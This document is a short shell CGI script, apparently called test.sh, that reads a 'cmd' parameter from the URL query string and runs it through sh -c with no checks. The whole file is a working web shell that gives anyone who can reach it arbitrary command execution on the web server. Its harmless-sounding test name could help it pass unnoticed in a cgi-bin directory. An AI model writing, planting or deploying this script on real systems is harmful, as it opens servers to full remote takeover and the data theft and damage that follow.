#!/bin/sh
# Simple CGI that executes a command passed via the query string as cmd=...
# Example: /cgi-bin/test.sh?cmd=id

echo "Content-Type: text/plain"
echo

if [ -n "$QUERY_STRING" ]; then
  CMD=$(printf '%s' "$QUERY_STRING" | sed -n 's/^cmd=\(.*\)$/\1/p')
  if [ -n "$CMD" ]; then
    sh -c "$CMD"
    exit 0
  fi
fi

echo "Usage: /cgi-bin/test.sh?cmd=<shell-command>"
